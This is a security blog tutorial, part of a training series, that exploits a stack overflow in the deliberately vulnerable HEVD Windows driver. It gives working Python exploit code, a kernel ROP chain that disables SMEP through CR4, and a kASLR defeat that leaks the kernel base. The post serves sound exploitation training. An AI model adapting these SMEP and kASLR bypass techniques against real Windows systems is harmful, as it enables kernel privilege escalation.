---
slug: hevd-smep-bypass/
title: 'HEVD: kASLR + SMEP Bypass'
date: 2020-09-18
category: attacks
subtitle: Bypassing OS protections
tags: osee, training, exploit, windows, kernel, hevd
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330914/blog/hevd-smep-bypass/cover_iwwedx.webp
alt: Photo by Michael Dziedzic on Unsplash
description: In this article we will defeat some protections using several
  techniques for exploting HackSys Extremely Vulnerable Driver
keywords: Business, Information, Security, Protection, Hacking, Exploit, OSEE,
  Ethical Hacking, Pentesting
author: Andres Roldan
writer: aroldan
name: Andres Roldan
about1: Cybersecurity Specialist, OSCE, OSCP, CHFI
about2: We don't need the key, we'll break in — RATM
source: https://unsplash.com/photos/1bjsASjhfkE
---

During the last posts, we’ve been dealing with exploitation in Windows
Kernel space. We are using [HackSys Extremely Vulnerable
Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)
or `HEVD` as the target which is composed of several vulnerabilities to
let practitioners sharpen the Windows Kernel exploitation skills.

In the last [post](../hevd-dos/), we successfully created a DoS exploit
leveraging a stack overflow vulnerability in `HEVD`. The DoS ocurred
because we placed an arbitrary value on `EIP` (`41414141`) and when the
OS tried to access that memory address, it was not accessible.

In this article, we will use that ability to overwrite `EIP` to execute
code in privileged mode.

During the exploitation process, we will come across with Supervisor
Mode Execution Prevention or `SMEP` which will thwart our exploit. But
fear not: we will be able to bypass it.

## Local vs Remote exploitation

When we were exploiting [Vulnserver](../tags/vulnserver/), we were doing
remote exploitation to a user-space application. That kind of
environment has certain specific restrictions, the most notorious are
limited buffer space to insert our payload, character restrictions and
`ASLR` (Address Space Layout Randomization).

When we are exploiting the Windows Kernel, it is assumed that we already
have unprivileged local access to the target machine. In that
environment, those restrictions are not longer a major issue. For
example, the buffer space problem and character restrictions are easily
circumvented by allocating dynamic memory with `VirtualAlloc()`, moving
the raw payload to that buffer and overwriting `EIP` with the returned
pointer.

`ASLR` and `kASLR` (Kernel `ASLR`) is not an issue either, because it
works by randomizing the base memory of the modules at every restart,
but if we have local access, there are functions in the Windows API that
will reveal the current kernel base address.

However, other protections come to scene when trying to exploit at
kernel level, like `DEP`, `SMEP`, `CFG`, etc. We will surely come across
with some of them later. Stay tuned.

## Stack Overflow exploitation

We left off our [previous article](../hevd-dos/) performing a DoS to the
target machine, on where we used the following exploit:

``` python
#!/usr/bin/env python3
"""
HackSysExtremeVulnerableDrive Stack Overflow.

Vulnerable Software: HackSysExtremeVulnerableDrive
Version: 3.00
Exploit Author: Andres Roldan
Tested On: Windows 10 1703
Writeup: https://fluidattacks.com/blog/hevd-smep-bypass/
"""

from infi.wioctl import DeviceIoControl

DEVICE_NAME = r'\\.\HackSysExtremeVulnerableDriver'

IOCTL_HEVD_STACK_OVERFLOW = 0x222003
SIZE = 3000

PAYLOAD = (
    b'A' * SIZE
)

HANDLE = DeviceIoControl(DEVICE_NAME)
HANDLE.ioctl(IOCTL_HEVD_STACK_OVERFLOW, PAYLOAD, SIZE, 0, 0)
```

And we were able to overwrite `EIP` with the value `41414141`. If we are
going to perform something more interesting, we must start by locating
the exact offset on which `EIP` is overwritten. Just like on any other
user-space exploitation process, we can create a cyclic pattern to find
that offset. We can use `mona` to do that:

<div class="imgblock">

![Mona Cyclic
Pattern](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330915/blog/hevd-smep-bypass/mona1_bhfpei.gif)

</div>

Then, update our exploit:

``` python
#!/usr/bin/env python3
"""
HackSysExtremeVulnerableDrive Stack Overflow.

Vulnerable Software: HackSysExtremeVulnerableDrive
Version: 3.00
Exploit Author: Andres Roldan
Tested On: Windows 10 1703
Writeup: https://fluidattacks.com/blog/hevd-smep-bypass/
"""

from infi.wioctl import DeviceIoControl

DEVICE_NAME = r'\\.\HackSysExtremeVulnerableDriver'

IOCTL_HEVD_STACK_OVERFLOW = 0x222003

PAYLOAD = (
    b'<insert pattern here>'
)

SIZE = len(PAYLOAD)

HANDLE = DeviceIoControl(DEVICE_NAME)
HANDLE.ioctl(IOCTL_HEVD_STACK_OVERFLOW, PAYLOAD, SIZE, 0, 0)
```

And check it:

<div class="imgblock">

![Mona Cyclic
Pattern](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330917/blog/hevd-smep-bypass/mona2_nljhdo.gif)

</div>

Good, `mona` discovered that EIP gets overwritten starting at byte
`2080`.

Now, for illustration purposes, we’ll create a simple shellcode to make
`EAX = 0xdeadbeef`. Then, we must copy it in a dynamic generated
location created by `VirtualAlloc()`. The return value of
`VirtualAlloc()` is a pointer that will be placed starting at byte 2081
of our buffer to divert the execution flow to our shellcode.

Let’s update our exploit with that:

``` python
#!/usr/bin/env python3
"""
HackSysExtremeVulnerableDrive Stack Overflow.

Vulnerable Software: HackSysExtremeVulnerableDrive
Version: 3.00
Exploit Author: Andres Roldan
Tested On: Windows 10 1703
Writeup: https://fluidattacks.com/blog/hevd-smep-bypass/
"""

import struct
from ctypes import windll, c_int
from infi.wioctl import DeviceIoControl

KERNEL32 = windll.kernel32
DEVICE_NAME = r'\\.\HackSysExtremeVulnerableDriver'
IOCTL_HEVD_STACK_OVERFLOW = 0x222003

SHELLCODE = (
    b'\xb8\xef\xbe\xad\xde' +     # mov eax,0xdeadbeef
    b'\xcc'                       # INT3 -> software breakpoint
)

RET_PTR = KERNEL32.VirtualAlloc(
    c_int(0),                    # lpAddress
    c_int(len(SHELLCODE)),       # dwSize
    c_int(0x3000),               # flAllocationType = MEM_COMMIT | MEM_RESERVE
    c_int(0x40)                  # flProtect = PAGE_EXECUTE_READWRITE
)

KERNEL32.RtlMoveMemory(
    c_int(RET_PTR),              # Destination
    SHELLCODE,                   # Source
    c_int(len(SHELLCODE))        # Length
)

PAYLOAD = (
    b'A' * 2080 +
    struct.pack('<L', RET_PTR)
)

SIZE = len(PAYLOAD)

HANDLE = DeviceIoControl(DEVICE_NAME)
HANDLE.ioctl(IOCTL_HEVD_STACK_OVERFLOW, PAYLOAD, SIZE, 0, 0)
```

If everything comes as expected, `EAX` will have the value `0xdeadbeef`
and execution will pause at the inserted breakpoint `\xcc`. Let’s check
it:

<div class="imgblock">

![SMEP in
action](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330917/blog/hevd-smep-bypass/smep1_zdy5uw.gif)

</div>

Ouch\!

Our exploit was thwarted and the error
`ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY` was triggered when the first
instruction of our shellcode was trying to execute. That means that
`SMEP` did protect the kernel.

## SMEP: Supervisor Mode Execution Prevention

There’s a concept called [Protection
rings](https://en.wikipedia.org/wiki/Protection_ring) which is used by
operating systems to delimit capabilities and provide fault tolerance,
by defining levels of privileges. Windows OS versions uses only 2
Current Privilege Levels (`CPL`): 0 and 3. `CPL` levels are also
referred as `rings`. `CPL0` or `ring-0` is where the kernel is executed
and `CPL3` or `ring-3` is where user mode instructions are performed.

`SMEP` is a protection introduced at CPU-level which prevents the kernel
to execute code belonging to `ring-3`.

The `ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY` exception was triggered
because `HEVD` is executing at `ring-0` and after overwriting `EIP`, it
was trying to run the instructions in our shellcode which was allocated
at `ring-3`.

Technically, `SMEP` is nothing but a bit in a CPU control register,
specifically the 20th bit of the `CR4` control register:

<div class="imgblock">

![CR4
register](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330911/blog/hevd-smep-bypass/cr4_wzdcnp.webp)

</div>

To bypass `SMEP`, we must flip that bit (make it `0`). As can be seen,
the current value of `CR4` with `SMEP` enabled is `001406e9`. Let’s
check what would be the value after flipping the 20th bit:

<div class="imgblock">

![CR4
register](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330912/blog/hevd-smep-bypass/cr42_abunfu.webp)

</div>

It would be `000406e9`. We need to place that value on `CR4` to turn off
`SMEP`.

But, how can we do that if we are not allowed to execute instructions at
`ring-3`? [ROP](../bypassing-dep/) comes to the rescue\! We need to
execute a `ROP` chain with instructions that are already in kernel mode.
At `ring-0` `ROP` is often referred as `kROP`. We then need to execute a
`kROP` chain and change the value of `CR4`. With that, we should be able
to make `EAX = 0xdeadbeef`.

In `nt!KeFlushCurrentTb`, we find a gadget that sets `CR4` from whatever
value `EAX` may have: `mov cr4, eax # ret`

<div class="imgblock">

![CR4
ROP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330913/blog/hevd-smep-bypass/cr4-rop_qsyqgw.webp)

</div>

Now, we need to calculate the offset of that `ROP` gadget from the start
of the `nt` module:

<div class="imgblock">

![CR4 ROP
Offset](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330911/blog/hevd-smep-bypass/offset1_ztkull.webp)

</div>

The offset is `0011f8de`. We’ll use that later.

Now we need to find a `pop eax # ret` gadget. We can find one at
`nt!_MapCMDevicePropertyToNtProperty+0x39`:

<div class="imgblock">

![POP EAX
ROP](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330912/blog/hevd-smep-bypass/popeax-rop_fuafnn.webp)

</div>

And the offset from the start of the `nt` module is `0002bbef`:

<div class="imgblock">

![POP EAX
Offset](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330912/blog/hevd-smep-bypass/offset2_tzgwnp.webp)

</div>

We must remember to pad our `ROP` chain with 8 bytes because the
overflowed function epilog uses `ret 8` which will return to the value
pointed by `ESP` and then will pop 8 bytes from the stack:

<div class="imgblock">

![ROP
Padding](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330911/blog/hevd-smep-bypass/rop-padding_b9rtmd.webp)

</div>

With that, we can now disable `SMEP`\!

## Defeating kASLR

We’ve got all the required information to create the `ROP` chain to
disable `SMEP`. However, we need to deal with kernel `ASLR`. As I
mentioned before, there are several functions that can be executed in
user mode (`ring-3`) that can give information of addresses at `ring-0`.
The most used are `NtQuerySystemInformation()` and
`EnumDeviceDrivers()`. The later is the simpler. With the following
code, you can get the kernel base address:

``` python
import sys
from ctypes import windll, c_ulong, byref, sizeof

PSAPI = windll.psapi

def get_kernel_base():
    """Obtain kernel base address."""
    buff_size = 0x4

    base = (c_ulong * buff_size)(0)

    if not PSAPI.EnumDeviceDrivers(base, sizeof(base), byref(c_ulong())):
        print('Failed to get kernel base address.')
        sys.exit(1)
    return base[0]

BASE_ADDRESS = get_kernel_base()
print(f'Obtained kernel base address: {hex(BASE_ADDRESS)}')
```

And check it:

<div class="imgblock">

![Kernel Base
Address](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330912/blog/hevd-smep-bypass/leak1_jtbpi1.webp)

</div>

As you can see, it matches perfectly to the address reported by
`WinDBG`:

<div class="imgblock">

![Kernel Base
Address](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330911/blog/hevd-smep-bypass/leak2_iwvv7t.webp)

</div>

With that, we can update our exploit, adding the `ROP` chain to disable
`SMEP`, using the offsets of the gadgets and the value returned from
that function to obtain absolute addresses, defeating `kASLR`\!

``` python
#!/usr/bin/env python3
"""
HackSysExtremeVulnerableDrive Stack Overflow.

Vulnerable Software: HackSysExtremeVulnerableDrive
Version: 3.00
Exploit Author: Andres Roldan
Tested On: Windows 10 1703
Writeup: https://fluidattacks.com/blog/hevd-smep-bypass/
"""

import struct
import sys
from ctypes import windll, c_int, c_ulong, byref, sizeof
from infi.wioctl import DeviceIoControl

KERNEL32 = windll.kernel32
PSAPI = windll.psapi
DEVICE_NAME = r'\\.\HackSysExtremeVulnerableDriver'
IOCTL_HEVD_STACK_OVERFLOW = 0x222003


def get_kernel_base():
    """Obtain kernel base address."""
    buff_size = 0x4

    base = (c_ulong * buff_size)(0)

    if not PSAPI.EnumDeviceDrivers(base, sizeof(base), byref(c_ulong())):
        print('Failed to get kernel base address.')
        sys.exit(1)
    return base[0]


BASE_ADDRESS = get_kernel_base()
print(f'Obtained kernel base address: {hex(BASE_ADDRESS)}')

SHELLCODE = (
    b'\xb8\xef\xbe\xad\xde' +     # mov eax,0xdeadbeef
    b'\xcc'                       # INT3 -> software breakpoint
)

RET_PTR = KERNEL32.VirtualAlloc(
    c_int(0),                    # lpAddress
    c_int(len(SHELLCODE)),       # dwSize
    c_int(0x3000),               # flAllocationType = MEM_COMMIT | MEM_RESERVE
    c_int(0x40)                  # flProtect = PAGE_EXECUTE_READWRITE
)

KERNEL32.RtlMoveMemory(
    c_int(RET_PTR),              # Destination
    SHELLCODE,                   # Source
    c_int(len(SHELLCODE))        # Length
)

ROP_CHAIN = (
    struct.pack('<L', BASE_ADDRESS + 0x0002bbef) +     #  pop eax # ret
    struct.pack('<L', 0x42424242) +                    #  Padding for ret 8
    struct.pack('<L', 0x42424242) +                    #
    struct.pack('<L', 0x000406e9) +                    #  Value to disable SMEP
    struct.pack('<L', BASE_ADDRESS + 0x0011f8de) +     #  mov cr4, eax # ret
    struct.pack('<L', RET_PTR)                         #  Pointer to shellcode
)

PAYLOAD = (
    b'A' * 2080 +
    ROP_CHAIN
)

SIZE = len(PAYLOAD)

HANDLE = DeviceIoControl(DEVICE_NAME)
HANDLE.ioctl(IOCTL_HEVD_STACK_OVERFLOW, PAYLOAD, SIZE, 0, 0)
```

Looks good. Now check it:

<div class="imgblock">

![Success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330911/blog/hevd-smep-bypass/success1_ji7qih.gif)

</div>

And this is the content of the `CR4` register:

<div class="imgblock">

![Success](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330912/blog/hevd-smep-bypass/smep-disabled_fsvseg.webp)

</div>

As you can see, we were able to disable `SMEP` and made `EAX
= 0xdeadbeef`\!

## Conclusions

In this post we were able to execute a shellcode which made `EAX
= 0xdeadbeef`. We also bypassed `SMEP` protection using a `kROP` chain
and defeated `kASLR` by leaking the kernel base address from `ring-3`.
However, we have still have to get a privileged shell on this system,
which will be covered in the [next
article](../hevd-privilege-escalation/).
